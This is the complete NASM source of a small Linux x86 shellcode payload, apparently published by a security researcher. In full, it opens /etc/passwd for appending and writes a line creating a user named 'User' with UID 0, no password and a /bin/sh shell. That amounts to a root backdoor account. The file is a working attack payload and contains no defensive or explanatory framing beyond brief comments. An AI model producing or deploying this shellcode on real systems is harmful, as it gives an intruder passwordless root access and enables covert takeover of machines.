; Filename: adduser_small.nasm - 74 bytes
; Date 12th October 2019
; Author:  @bolonobolo
; Web:  https://blackcloud.me
; Tested on: Linux x86
global _start			

section .text
_start:

  
        xor ebx, ebx
        xor ecx, ecx
        mov cx, 0x401
        mul ebx                           ; this put 0 in eax and edx
        push ebx                  
        push dword 0x64777373    
        push dword 0x61702f63   
        push dword 0x74652f2f  
        lea ebx, [esp]                    ; same as mov the stack pointer to ebx
        mov al, 0x5
        int 0x80
        xchg ebx, eax                     ; move fd pointer in ebx
        mul edx                           ; this put 0 in eax and edx
        push dword 0x68732f6e             ; hs/nib/:/::0:0::resU
        push dword 0x69622f3a             ;
        push dword 0x2f3a3a30             ;
        push dword 0x3a303a3a             ;
        push dword 0x72657355             ;
        lea ecx, [esp]                    ; same as mov the stack pointer to ecx
        mov dl, 0x14
        mov al, 0x4
        int 0x80                    ; exit syscall now, the close syscall isn't necessary
        sub al, 0x13                ; write return the number of byte written (14) 14 - 13 = 1
        int 0x80
